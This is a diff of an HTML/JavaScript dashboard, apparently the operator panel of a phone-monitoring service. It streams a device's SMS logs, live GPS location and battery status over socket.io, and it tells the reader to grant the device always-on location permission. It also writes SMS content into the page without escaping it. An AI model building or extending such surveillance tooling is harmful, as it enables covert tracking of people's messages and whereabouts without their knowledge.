@@ -1,122 +1,137 @@
-    <!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Device Management Console</title>
     <script src="/socket.io/socket.io.js"></script>
+    
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     
     <style>
-        /* NORMAL PROFESSIONAL FONT */
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; background: #f4f7f6; color: #333; }
-        #smsSearch { 
-    width: 100%; 
-    padding: 12px; 
-    margin-bottom: 20px; 
-    border: 1px solid #ddd; 
-    border-radius: 6px; 
-    font-size: 1rem; 
-    box-sizing: border-box; 
-    outline: none;
-    color: #333;
-}
-        /* SIDEBAR */
-        .sidebar { width: 250px; background: #2c3e50; color: white; height: 100vh; position: fixed; }
-        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; }
-        .nav-item:hover, .active { background: #1abc9c; color: white; }
+        :root { 
+            --bg-color: #f4f7f6; 
+            --sidebar-color: #2c3e50; 
+            --accent-color: #1abc9c; 
+            --text-main: #333333;
+            --text-muted: #7f8c8d;
+            --white: #ffffff;
+        }
 
-        /* FIXED GPS HEADER */
+        body { 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            background: var(--bg-color); 
+            color: var(--text-main); 
+        }
+        
+        /* SIDEBAR */
+        .sidebar { width: 250px; background: var(--sidebar-color); color: var(--white); height: 100vh; position: fixed; box-shadow: 2px 0 5px rgba(0,0,0,0.1); }
+        .sidebar-brand { padding: 25px 20px; font-size: 1.2rem; font-weight: bold; border-bottom: 1px solid #34495e; color: var(--accent-color); }
+        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; color: #bdc3c7; }
+        .nav-item:hover, .nav-item.active { background: var(--accent-color); color: var(--white); }
+
+        /* FIXED HEADER */
         .fixed-header {
             position: fixed; top: 0; left: 250px; right: 0; height: 90px;
-            background: white; border-bottom: 1px solid #ddd;
+            background: var(--white); border-bottom: 1px solid #ddd;
             display: flex; justify-content: space-between; align-items: center;
             padding: 0 30px; z-index: 1000;
         }
-        .gps-text { font-size: 0.9rem; color: #555; max-width: 60%; }
-        .gps-address { font-weight: bold; color: #2c3e50; display: block; margin-bottom: 4px; }
+        .gps-display { font-size: 0.9rem; color: var(--text-muted); line-height: 1.4; }
+        .gps-address { font-weight: bold; color: var(--sidebar-color); display: block; margin-bottom: 2px; font-size: 1rem; }
 
-        /* CONTENT */
-        .main-content { margin-left: 250px; padding-top: 100px; flex: 1; }
-        .view { display: none; padding: 20px; }
+        .status-container { display: flex; align-items: center; gap: 20px; }
+        .status-indicator { display: flex; align-items: center; gap: 8px; font-weight: bold; }
+        #status-dot { font-size: 2.5rem; line-height: 0; margin-top: -5px; color: #e74c3c; transition: color 0.5s; }
+
+        /* MAIN CONTENT AREA */
+        .main-content { margin-left: 250px; padding-top: 110px; flex: 1; height: 100vh; box-sizing: border-box; }
+        .view { display: none; padding: 0 30px 30px 30px; }
         .view.active { display: block; }
 
-        /* SEARCH & TABLE */
-        /* Update your table styles to this */
-table { 
-    width: 100%; 
-    border-collapse: collapse; 
-    background: #ffffff; /* White background for the table */
-    color: #333333;      /* Dark grey/black text color */
-    border-radius: 8px; 
-    overflow: hidden; 
-    box-shadow: 0 1px 3px rgba(0,0,0,0.1); 
-}
+        /* SEARCH BOX */
+        .search-bar {
+            width: 100%; padding: 12px 15px; margin-bottom: 20px; 
+            border: 1px solid #ced4da; border-radius: 6px; 
+            font-size: 1rem; box-sizing: border-box; outline: none;
+            background: var(--white); color: var(--text-main);
+        }
+        .search-bar:focus { border-color: var(--accent-color); box-shadow: 0 0 0 2px rgba(26, 188, 156, 0.2); }
 
-th { 
-    background: #f1f3f5; 
-    color: #495057; /* Darker grey for headers */
-    padding: 15px; 
-    text-align: left; 
-    font-weight: 600; 
-    border-bottom: 2px solid #dee2e6; 
-}
+        /* TABLE STYLING */
+        .table-container { background: var(--white); border-radius: 8px; overflow: hidden; box-shadow: 0 2px 12px rgba(0,0,0,0.05); }
+        table { width: 100%; border-collapse: collapse; }
+        th { background: #f8f9fa; padding: 15px; text-align: left; border-bottom: 2px solid #edf2f7; font-size: 0.85rem; color: var(--text-muted); text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid #edf2f7; font-size: 0.95rem; color: #2d3748 !important; vertical-align: top; }
+        
+        .Incoming { color: #27ae60 !important; font-weight: bold; }
+        .Outgoing { color: #2980b9 !important; font-weight: bold; }
 
-td { 
-    padding: 15px; 
-    border-bottom: 1px solid #eee; 
-    vertical-align: top; 
-    color: #212529 !important; /* This forces the message text to be dark */
-}
+        /* MAP AREA */
+        #map { width: 100%; height: calc(100vh - 200px); border-radius: 10px; border: 1px solid #ddd; background: #eee; }
 
-/* Keep your status colors but ensure they are readable */
-.Incoming { color: #28a745 !important; font-weight: bold; }
-.Outgoing { color: #007bff !important; font-weight: bold; }
-
-        #map { width: 100%; height: 500px; border-radius: 10px; border: 1px solid #ddd; }
+        /* BATTERY ICON */
+        .battery-stack { position: relative; font-size: 2rem; }
+        #bolt { position: absolute; left: 5px; color: #f1c40f; display: none; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <div style="padding: 20px; font-weight: bold; font-size: 1.2rem; border-bottom: 1px solid #34495e;">Control Center</div>
+    <div class="sidebar-brand">SYSTEM_MONITOR</div>
     <div class="nav-item active" onclick="showView('dash')">📊 Dashboard</div>
     <div class="nav-item" onclick="showView('sms')">✉️ Communication Logs</div>
-    <div class="nav-item" onclick="showView('map-view')">📍 Live Map</div>
+    <div class="nav-item" onclick="showView('map-view')">📍 Live Map Tracking</div>
 </div>
 
 <div class="fixed-header">
-    <div class="gps-text">
-        <span id="gps-addr" class="gps-address">Waiting for GPS fix...</span>
-        Accuracy: <span id="gps-acc">--</span>m | Last Update: <span id="gps-time">--</span>
+    <div class="gps-display">
+        <span id="gps-addr" class="gps-address">Initializing GPS satellite link...</span>
+        Accuracy: <span id="gps-acc">0.00</span>m | Last Fix: <span id="gps-time">--/--/-- --:--:--</span>
     </div>
-    <div style="display:flex; align-items:center; gap:15px;">
-        <div id="status-dot" style="color:red; font-size:3rem;">● </div>
-        <div style="font-size:1.5rem;"><span id="pct">--</span>%</div>
-        <div style="position:relative; font-size:2rem;">
-            🔋 <span id="bolt" style="position:absolute; left:6px; color:#f1c40f; display:none;">⚡</span>
+    
+    <div class="status-container">
+        <div class="status-indicator">
+            <span id="status-dot">●</span> 
+            <span id="status-text" style="font-size: 0.8rem;">OFFLINE</span>
+        </div>
+        <div style="font-size: 1.8rem; font-weight: 300;"><span id="pct">--</span>%</div>
+        <div class="battery-stack">
+            <span>🔋</span>
+            <span id="bolt">⚡</span>
         </div>
     </div>
 </div>
 
 <div class="main-content">
     <div id="dash" class="view active">
-        <h2>System Status</h2>
-        <p>Telemetry link is established.</p>
+        <h2>System Overview</h2>
+        <div class="table-container" style="padding: 20px;">
+            <p>Background monitoring services are active. Ensure the device has <b>"Allow all the time"</b> location permissions enabled for accurate tracking.</p>
+        </div>
     </div>
 
     <div id="sms" class="view">
-        <input type="text" id="smsSearch" placeholder="Search by number or message content..." onkeyup="filterSMS()">
-        <table>
-            <thead>
-                <tr>
-                    <th>Type</th>
-                    <th>Number</th>
-                    <th>Message</th>
-                    <th>Date/Time</th>
-                </tr>
-            </thead>
-            <tbody id="sms-table"></tbody>
-        </table>
+        <h2>Message History</h2>
+        <input type="text" id="smsSearch" class="search-bar" placeholder="Search by phone number or message content..." onkeyup="filterSMS()">
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 100px;">Type</th>
+                        <th style="width: 180px;">Number</th>
+                        <th>Message</th>
+                        <th style="width: 180px;">Date/Time</th>
+                    </tr>
+                </thead>
+                <tbody id="sms-table">
+                    <tr><td colspan="4" style="text-align:center; padding:40px; color:#999;">Requesting data from device...</td></tr>
+                </tbody>
+            </table>
+        </div>
     </div>
 
     <div id="map-view" class="view">
@@ -128,54 +143,87 @@ td {
     const socket = io();
     let map, marker, allSMS = [];
 
+    // Navigation Logic
     function showView(id) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        
         document.getElementById(id).classList.add('active');
+        event.currentTarget.classList.add('active');
+
         if(id === 'map-view') {
             setTimeout(() => { 
-                if(!map) {
-                    map = L.map('map').setView([0, 0], 2);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                    marker = L.marker([0, 0]).addTo(map);
-                }
+                if(!map) initMap();
                 map.invalidateSize(); 
-            }, 200);
+            }, 300);
         }
         if(id === 'sms') socket.emit('get-sms-request');
     }
 
-    socket.on('battery-status', (data) => { // Changed from ui-battery to match service
-        document.getElementById('pct').innerText = data.percent;
-        document.getElementById('status-dot').style.color = "green";
-        document.getElementById('bolt').style.display = data.charging ? "block" : "none";
-    });
+    // Initialize OpenStreetMap
+    function initMap() {
+        map = L.map('map').setView([0, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19,
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
+        marker = L.marker([0, 0]).addTo(map);
+    }
 
+    // --- SOCKET EVENT LISTENERS (Synchronized with MonitorService.java) ---
+
+    // GPS Updates
     socket.on('gps-update', (data) => {
         document.getElementById('gps-addr').innerText = data.address;
         document.getElementById('gps-acc').innerText = data.accuracy;
         document.getElementById('gps-time').innerText = data.time;
         
-        if(map && data.lat && data.lng) {
+        if(data.lat && data.lng) {
             const pos = [data.lat, data.lng];
+            if(!map) initMap();
             map.setView(pos, 16);
             marker.setLatLng(pos);
+            updateStatus(true);
         }
     });
 
-  socket.on('sms-data-log', (data) => { // Changed from ui-sms-display to match service
-        allSMS = data;
-        renderSMS(allSMS);
+    // Battery Updates
+    socket.on('battery-status', (data) => {
+        document.getElementById('pct').innerText = data.percent;
+        document.getElementById('bolt').style.display = data.charging ? "block" : "none";
+        updateStatus(true);
     });
 
+    // SMS Log Updates
+    socket.on('sms-data-log', (data) => {
+        allSMS = data;
+        renderSMS(allSMS);
+        updateStatus(true);
+    });
+
+    function updateStatus(isOnline) {
+        const dot = document.getElementById('status-dot');
+        const text = document.getElementById('status-text');
+        dot.style.color = isOnline ? "#2ecc71" : "#e74c3c";
+        text.innerText = isOnline ? "ONLINE" : "OFFLINE";
+        text.style.color = isOnline ? "#2ecc71" : "#e74c3c";
+    }
+
+    // --- TABLE RENDERING & FILTERING ---
+
     function renderSMS(data) {
-        const body = document.getElementById('sms-table');
-        body.innerHTML = data.map(m => `
+        const tableBody = document.getElementById('sms-table');
+        if(data.length === 0) {
+            tableBody.innerHTML = '<tr><td colspan="4" style="text-align:center;">No messages found.</td></tr>';
+            return;
+        }
+
+        tableBody.innerHTML = data.map(m => `
             <tr>
-                <td class="${m.type}">${m.type}</td>
-                <td><b>${m.address}</b></td>
+                <td class="${m.type}">${m.type.toUpperCase()}</td>
+                <td style="font-weight: 600;">${m.address}</td>
                 <td>${m.body}</td>
-                <td style="color:#999; font-size:0.8rem;">${new Date(m.date).toLocaleString()}</td>
+                <td style="color:#7f8c8d; font-size:0.85rem;">${new Date(m.date).toLocaleString()}</td>
             </tr>
         `).join('');
     }
@@ -188,9 +236,10 @@ td {
         );
         renderSMS(filtered);
     }
+
+    // Connection Watchdog
+    socket.on('disconnect', () => updateStatus(false));
 </script>
+
 </body>
 </html>
-
-
-
